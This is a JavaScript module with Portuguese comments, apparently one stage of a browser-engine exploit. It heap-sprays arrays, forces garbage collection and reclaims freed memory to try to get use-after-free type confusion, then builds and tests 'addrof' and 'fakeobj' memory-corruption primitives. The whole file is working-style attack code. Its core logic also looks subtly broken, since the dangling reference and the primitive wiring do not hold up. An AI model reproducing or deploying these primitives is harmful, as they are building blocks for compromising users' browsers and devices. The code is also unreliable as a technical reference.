// js/script3/testArrayBufferVictimCrash.mjs (Foco em addrof e fakeobj)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

// --- Etapa 1: O Coração do Exploit - Primitivas via UAF ---

// Função auxiliar para forçar a Coleta de Lixo (Garbage Collection)
function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 2000; i++) {
            // Aloca e libera memória para pressionar o GC
            arr.push(new ArrayBuffer(1024 * 64));
        }
    } catch (e) {
        logS3("GC acionado (erro de memória esperado).", "info", "triggerGC");
    }
    PAUSE_S3(100); // Pequena pausa para o GC atuar
}

// Cria as primitivas addrof e fakeobj
function createAddrofAndFakeobjPrimitives() {
    logS3("--- Iniciando criação de primitivas addrof/fakeobj via UAF ---", "subtest");

    // Spray para preparar o heap
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push([1.1, 2.2, 3.3, 4.4]); // Arrays de double
    }

    // Cria o ponteiro pendurado para um dos arrays
    let dangling_ref = spray[spray.length - 1];
    const original_dangling_value = dangling_ref[0]; // Salva um valor original para verificação
    spray = null;

    // Força o GC para liberar a memória do objeto que `dangling_ref` apontava
    triggerGC();

    // Reclama a memória com um tipo de objeto diferente: arrays de objetos
    let reclaim_spray = [];
    for (let i = 0; i < 2048; i++) {
        reclaim_spray.push([{a:1}, {b:2}]);
    }

    // Verifica se a confusão de tipos ocorreu
    if (dangling_ref[0] === original_dangling_value) {
        throw new Error("Falha no UAF. A referência pendurada não foi sobrescrita. Tente novamente.");
    }
    logS3("    SUCESSO: Confusão de tipos via UAF confirmada!", "vuln", "createPrimitives");
    logS3("    A referência `dangling_ref` agora aponta para um array de objetos.", "info");

    // Agora `dangling_ref` é a nossa chave para as primitivas
    const leaker_obj = dangling_ref[0];  // Este é um objeto {a:1}
    const victim_obj = { shellcode: 0 }; // Objeto que vamos corromper

    dangling_ref[1] = victim_obj; // Coloca nosso objeto vítima no array sobreposto

    const original_victim_addr_double = leaker_obj.a;

    // Primitiva ADDR_OF: obtém o endereço de um objeto
    const addrof = (obj_to_leak) => {
        leaker_obj.a = obj_to_leak; // Coloca o objeto alvo no lugar do double
        const leaked_addr_double = victim_obj.shellcode; // Lê o endereço como se fosse um double

        leaker_obj.a = original_victim_addr_double; // Restaura para estabilidade

        const buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = leaked_addr_double;
        const int_view = new Uint32Array(buf);
        return new AdvancedInt64(int_view[0], int_view[1]);
    };

    // Primitiva FAKE_OBJ: obtém um objeto a partir de um endereço
    const fakeobj = (addr_to_fake) => {
        // Função para converter o endereço (AdvancedInt64) para double
        const addressAsDouble = (addr) => {
            const buf = new ArrayBuffer(8);
            const int_view = new Uint32Array(buf);
            int_view[0] = addr.low();
            int_view[1] = addr.high();
            return (new Float64Array(buf))[0];
        };

        const addr_double = addressAsDouble(addr_to_fake);
        victim_obj.shellcode = addr_double; // Escreve o endereço como double

        const faked_obj = leaker_obj.a; // Lê o objeto "falso" que está no endereço
        victim_obj.shellcode = original_victim_addr_double; // Restaura

        return faked_obj;
    };

    logS3("    Primitivas `addrof` e `fakeobj` criadas com sucesso!", "good");
    return { addrof, fakeobj };
}


// --- Etapa 2: Função Principal do Teste ---

export async function executeAddrofAndFakeObjTest() {
    try {
        logS3("--- Teste de Primitivas (Addrof/Fakeobj) ---", "test");

        // 1. Criar as primitivas
        const { addrof, fakeobj } = createAddrofAndFakeobjPrimitives();

        // 2. Testar as primitivas
        logS3("--- Testando a funcionalidade das primitivas ---", "subtest");

        const test_object = { a: 0x41414141, b: 0x42424242 };
        logS3(`Objeto de teste criado: ${JSON.stringify(test_object)}`, "info");

        // Teste Addrof
        const test_object_addr = addrof(test_object);
        logS3(`[addrof] Endereço do objeto de teste: ${test_object_addr.toString(true)}`, "leak");
        if (test_object_addr.high() === 0 || test_object_addr.low() === 0) {
            throw new Error("addrof retornou um endereço nulo ou inválido.");
        }
        logS3("[addrof] Teste de `addrof` passou!", "good");

        // Teste Fakeobj
        const faked_test_object = fakeobj(test_object_addr);
        logS3(`[fakeobj] Objeto falso criado a partir do endereço.`, "info");

        // Verificação final
        if (faked_test_object.a !== 0x41414141 || faked_test_object.b !== 0x42424242) {
             throw new Error(`fakeobj falhou. Valores não correspondem. Recebido: a=${toHex(faked_test_object.a)}, b=${toHex(faked_test_object.b)}`);
        }
        logS3("[fakeobj] Teste de `fakeobj` passou! Os valores do objeto falso correspondem.", "good");

        logS3("TODOS OS TESTES DE PRIMITIVAS PASSARAM!", "vuln");
        document.title = "Addrof/Fakeobj SUCCESS!";
        return { success: true, addrof, fakeobj };

    } catch (e) {
        logS3(`O teste de primitivas falhou: ${e.message}`, "critical");
        document.title = "Addrof/Fakeobj FAIL";
        return { success: false, errorOccurred: e.message };
    }
}
